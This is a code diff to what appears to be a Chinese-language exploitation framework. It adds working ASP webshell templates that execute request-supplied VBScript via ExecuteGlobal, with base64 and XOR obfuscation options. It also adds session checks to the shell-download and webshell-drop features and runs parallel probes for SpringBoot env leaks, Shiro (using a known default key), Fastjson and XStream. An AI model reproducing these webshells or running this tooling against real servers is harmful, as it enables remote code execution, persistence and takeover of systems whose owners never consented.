@@ -3282,6 +3282,8 @@ def ex_shell_download(target, p):
     local = (p.get("local") or "").strip()
     if not sid:
         return {"ok": False, "output": "缺少 sid（先让目标通过 Shiro / XStream shell 模式上线）"}
+    if not STATE["sessions"].get(sid):
+        return {"ok": False, "output": "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"}
     if not remote:
         return {"ok": False, "output": "请填写目标路径 remote"}
     lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
@@ -3405,11 +3407,69 @@ def _gen_webshell(lang, password, encoding):
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
                     "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
         code = head + body
-    else:  # asp：仅 plain（ExecuteGlobal 执行传入的 VBScript）；base64/xor 退化为 plain 写法
-        code = "<%% If Request(\"%s\")<>\"\" Then ExecuteGlobal(Request(\"%s\")) End If %%>" % (pw, pw)
-        if encoding != "plain":
-            code += ("\n<!-- 注: ASP 仅实现 plain 模式（ExecuteGlobal 直接执行传入脚本）；"
-                     "base64/xor 已按 plain 等价生成 -->")
+    else:  # asp：plain / base64 / xor 三种编码均真实生效（与 PHP/JSP 一致）
+        # 与 PHP/JSP 共用同一把 xor 密钥，保证客户端编码逻辑一致
+        ASP_XOR_KEY = "dkx0r"
+        # base64：用 MSXML 做 base64 解码得到原始 VBScript 字节流，再 ExecuteGlobal
+        asp_b64 = (
+            "<%%\r\n"
+            "Function DK_B64(b64)\r\n"
+            "  Set o=CreateObject(\"MSXML2.DOMDocument.3.0\")\r\n"
+            "  Set e=o.createElement(\"b64\")\r\n"
+            "  e.dataType=\"bin.base64\"\r\n"
+            "  e.text=b64\r\n"
+            "  DK_B64=e.nodeTypedValue\r\n"
+            "End Function\r\n"
+            "Function DK_S(b)\r\n"
+            "  Dim t,i\r\n"
+            "  t=\"\"\r\n"
+            "  For i=0 To UBound(b)\r\n"
+            "    t=t&Chr(b(i))\r\n"
+            "  Next\r\n"
+            "  DK_S=t\r\n"
+            "End Function\r\n"
+            "Dim dk_v\r\n"
+            "dk_v=Request(\"%s\")\r\n"
+            "If dk_v<>\"\" Then ExecuteGlobal(DK_S(DK_B64(dk_v)))\r\n"
+            "%%>"
+        )
+        # xor：先 base64 解码，再按密钥逐字节循环异或还原，再 ExecuteGlobal
+        asp_xor = (
+            "<%%\r\n"
+            "Function DK_B64(b64)\r\n"
+            "  Set o=CreateObject(\"MSXML2.DOMDocument.3.0\")\r\n"
+            "  Set e=o.createElement(\"b64\")\r\n"
+            "  e.dataType=\"bin.base64\"\r\n"
+            "  e.text=b64\r\n"
+            "  DK_B64=e.nodeTypedValue\r\n"
+            "End Function\r\n"
+            "Function DK_X(b,k)\r\n"
+            "  Dim i,c\r\n"
+            "  For i=0 To UBound(b)\r\n"
+            "    c=Asc(Mid(k,(i Mod Len(k))+1,1))\r\n"
+            "    b(i)=b(i) Xor c\r\n"
+            "  Next\r\n"
+            "  DK_X=b\r\n"
+            "End Function\r\n"
+            "Function DK_S(b)\r\n"
+            "  Dim t,i\r\n"
+            "  t=\"\"\r\n"
+            "  For i=0 To UBound(b)\r\n"
+            "    t=t&Chr(b(i))\r\n"
+            "  Next\r\n"
+            "  DK_S=t\r\n"
+            "End Function\r\n"
+            "Dim dk_v\r\n"
+            "dk_v=Request(\"%s\")\r\n"
+            "If dk_v<>\"\" Then ExecuteGlobal(DK_S(DK_X(DK_B64(dk_v),\"%s\")))\r\n"
+            "%%>"
+        )
+        if encoding == "base64":
+            code = asp_b64 % pw
+        elif encoding == "xor":
+            code = asp_xor % (pw, ASP_XOR_KEY)
+        else:
+            code = "<%% If Request(\"%s\")<>\"\" Then ExecuteGlobal(Request(\"%s\")) End If %%>" % (pw, pw)
     return code, ext
 
 
@@ -3424,6 +3484,8 @@ def ex_webshell_drop(target, p):
     sid = (p.get("sid") or "").strip()
     if not sid:
         return {"ok": False, "output": "缺少 sid（先通过 Shiro / XStream shell 模式上线）"}
+    if not STATE["sessions"].get(sid):
+        return {"ok": False, "output": "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"}
     lang = (p.get("lang") or "php").strip().lower()
     if lang not in ("php", "jsp", "asp"):
         return {"ok": False, "output": "lang 仅支持 php / jsp / asp"}
@@ -3498,74 +3560,124 @@ def ex_webshell_drop(target, p):
 
 
 def _auto_detect(target, p):
-    """功能 A 第 1 步：安全非破坏地探测 4 类漏洞，返回结构化结果。"""
+    """功能 A 第 1 步：安全非破坏地探测 4 类漏洞，返回结构化结果。
+
+    四类探测（SpringBoot / Shiro / Fastjson / XStream）各跑在独立线程中，主线程
+    join(detect_timeout) 后收集已完成的成果；超时的探测项标记为「超时/跳过」并继续
+    返回其余结构化结果。整体墙钟时间被 detect_timeout（默认 45s）限制，无论目标多慢
+    都不会挂死，且不会 500。各子探测仍保留原有单次超时（timeout 参数）。
+    """
     to = int(p.get("timeout", 8))
+    detect_timeout = float(p.get("detect_timeout", 45))
     res = {"springboot": {}, "shiro": {}, "fastjson": {}, "xstream": {}}
-    # SpringBoot：GET /actuator、/env（读 env，可能泄露 shiro key / 敏感信息）
-    try:
-        act = ex_springboot_actuator(target, {"timeout": to})
-        env = ex_springboot_env(target, {"timeout": to})
-        sb = {"actuator": act.get("output", ""),
-              "env_readable": bool(env.get("ok")),
-              "flags": env.get("flags", []),
-              "sensitive_count": 0,
-              "shiro_keys": []}
-        detail = env.get("detail", "")
-        for mt in re.finditer(r"疑似 Shiro 密钥：(\S+?)\s*=\s*(\S+)", detail):
-            sb["shiro_keys"].append(mt.group(2))
-        m = re.search(r"敏感项（(\d+)", detail)
-        if m:
-            sb["sensitive_count"] = int(m.group(1))
-        res["springboot"] = sb
-    except Exception as e:
-        res["springboot"] = {"error": str(e)}
-    # Shiro：用 dummy key 发 rememberMe，按 deleteMe 判断是否存在（未爆破、未真正利用）
-    try:
-        dummy = _shiro_cookie("kPH+bIxk5D2deZiIxcaaaA==", b"\xac\xed\x00\x05junk", "cbc")
-        r = http(normalize(target) + "/", headers={"Cookie": "rememberMe=%s" % dummy}, timeout=to)
-        sc = r["headers"].get("set-cookie", "")
-        present = "rememberMe=deleteMe" in sc
-        res["shiro"] = {"present": present, "set_cookie": sc[:200]}
-        if res["springboot"].get("shiro_keys"):
-            res["shiro"]["leaked_key"] = res["springboot"]["shiro_keys"][0]
-    except Exception as e:
-        res["shiro"] = {"error": str(e)}
-    # Fastjson：发安全探测载荷，靠报错特征识别（未真正利用）
-    try:
-        fj = ex_fastjson_probe(target, {"timeout": to})
-        res["fastjson"] = {"output": fj.get("output", ""),
-                           "detail": (fj.get("detail") or "")[:600]}
-    except Exception as e:
-        res["fastjson"] = {"error": str(e)}
-    # XStream：POST 最小 XML 探测，靠报错特征识别（未真正利用）
-    try:
-        xs = ex_xstream_probe(target, {"timeout": to})
-        res["xstream"] = {"output": xs.get("output", ""),
-                          "detail": (xs.get("detail") or "")[:600]}
-    except Exception as e:
-        res["xstream"] = {"error": str(e)}
+    lock = threading.Lock()
+
+    def _probe_springboot():
+        sb = {"actuator": "", "env_readable": False, "flags": [],
+              "sensitive_count": 0, "shiro_keys": []}
+        try:
+            act = ex_springboot_actuator(target, {"timeout": to})
+            env = ex_springboot_env(target, {"timeout": to})
+            sb["actuator"] = act.get("output", "")
+            sb["env_readable"] = bool(env.get("ok"))
+            sb["flags"] = env.get("flags", [])
+            detail = env.get("detail", "")
+            for mt in re.finditer(r"疑似 Shiro 密钥：(\S+?)\s*=\s*(\S+)", detail):
+                sb["shiro_keys"].append(mt.group(2))
+            m = re.search(r"敏感项（(\d+)", detail)
+            if m:
+                sb["sensitive_count"] = int(m.group(1))
+        except Exception as e:
+            sb["error"] = str(e)
+        with lock:
+            res["springboot"] = sb
+
+    def _probe_shiro():
+        sh = {}
+        try:
+            dummy = _shiro_cookie("kPH+bIxk5D2deZiIxcaaaA==", b"\xac\xed\x00\x05junk", "cbc")
+            r = http(normalize(target) + "/", headers={"Cookie": "rememberMe=%s" % dummy},
+                     timeout=to)
+            sc = r["headers"].get("set-cookie", "")
+            sh["present"] = "rememberMe=deleteMe" in sc
+            sh["set_cookie"] = sc[:200]
+        except Exception as e:
+            sh["error"] = str(e)
+        with lock:
+            res["shiro"] = sh
+
+    def _probe_fastjson():
+        fj = {}
+        try:
+            r = ex_fastjson_probe(target, {"timeout": to})
+            fj["output"] = r.get("output", "")
+            fj["detail"] = (r.get("detail") or "")[:600]
+        except Exception as e:
+            fj["error"] = str(e)
+        with lock:
+            res["fastjson"] = fj
+
+    def _probe_xstream():
+        xs = {}
+        try:
+            r = ex_xstream_probe(target, {"timeout": to})
+            xs["output"] = r.get("output", "")
+            xs["detail"] = (r.get("detail") or "")[:600]
+        except Exception as e:
+            xs["error"] = str(e)
+        with lock:
+            res["xstream"] = xs
+
+    threads = [
+        threading.Thread(target=_probe_springboot, name="dk-sb", daemon=True),
+        threading.Thread(target=_probe_shiro, name="dk-shiro", daemon=True),
+        threading.Thread(target=_probe_fastjson, name="dk-fj", daemon=True),
+        threading.Thread(target=_probe_xstream, name="dk-xs", daemon=True),
+    ]
+    deadline = time.time() + detect_timeout
+    for t in threads:
+        t.start()
+    for t in threads:
+        remain = max(0.0, deadline - time.time())
+        t.join(remain)
+    # 未完成的探测项（被 detect_timeout 截断）标记为超时，保证结构化返回不崩溃
+    for name, t in zip(("springboot", "shiro", "fastjson", "xstream"), threads):
+        if t.is_alive():
+            with lock:
+                res[name] = {"error": "探测超时（已跳过；全局 detect 截止 %.0fs）" % detect_timeout,
+                             "timeout": True}
+    # SpringBoot 泄露的 Shiro Key 反填到 shiro 探测项（各子探测并行，统一在 join 后汇总）
+    if (res["springboot"].get("shiro_keys")
+            and isinstance(res.get("shiro"), dict) and "present" in res["shiro"]):
+        res["shiro"]["leaked_key"] = res["springboot"]["shiro_keys"][0]
+
+    # 快照，避免后台线程（已置 daemon）后续写入影响已返回的响应结构
+    detect = {k: (dict(v) if isinstance(v, dict) else v) for k, v in res.items()}
 
     found = []
-    if res["springboot"].get("env_readable"):
+    if detect["springboot"].get("env_readable"):
         found.append("SpringBoot env 可读(敏感项 %d，flag %d)"
-                     % (res["springboot"].get("sensitive_count", 0),
-                        len(res["springboot"].get("flags", []))))
-    if res["shiro"].get("present"):
-        found.append("Shiro 存在%s" % ("(env 已泄露 Key)" if res["shiro"].get("leaked_key") else ""))
-    if "存在" in res["fastjson"].get("output", "") or "✅" in res["fastjson"].get("output", ""):
+                     % (detect["springboot"].get("sensitive_count", 0),
+                        len(detect["springboot"].get("flags", []))))
+    if detect["shiro"].get("present"):
+        found.append("Shiro 存在%s" % ("(env 已泄露 Key)" if detect["shiro"].get("leaked_key") else ""))
+    fj_out = detect["fastjson"].get("output", "")
+    if "存在" in fj_out or "✅" in fj_out:
         found.append("Fastjson 疑似存在")
-    if "疑似" in res["xstream"].get("output", "") or "确认" in res["xstream"].get("output", ""):
+    xs_out = detect["xstream"].get("output", "")
+    if "疑似" in xs_out or "确认" in xs_out:
         found.append("XStream 疑似存在")
     out = "探测完成。命中: " + ("；".join(found) if found else "无（或需人工复核各项 detail）")
     return {
         "ok": True,
         "output": out,
-        "detect": res,
-        "detail": ("探测均为安全非破坏性：\n"
+        "detect": detect,
+        "detail": ("探测均为安全非破坏性（4 类并行，整体截止 %.0fs）：\n"
                    "· SpringBoot: GET /actuator、/env（读 env，可能泄露 shiro key / 敏感信息）\n"
                    "· Shiro: 用 dummy key 发 rememberMe，按 deleteMe 判断是否存在（未爆破）\n"
                    "· Fastjson / XStream: 发安全探测载荷，靠报错特征识别（未真正利用）\n\n"
-                   + json.dumps(res, ensure_ascii=False, indent=2)),
+                   % detect_timeout
+                   + json.dumps(detect, ensure_ascii=False, indent=2)),
     }
 
 
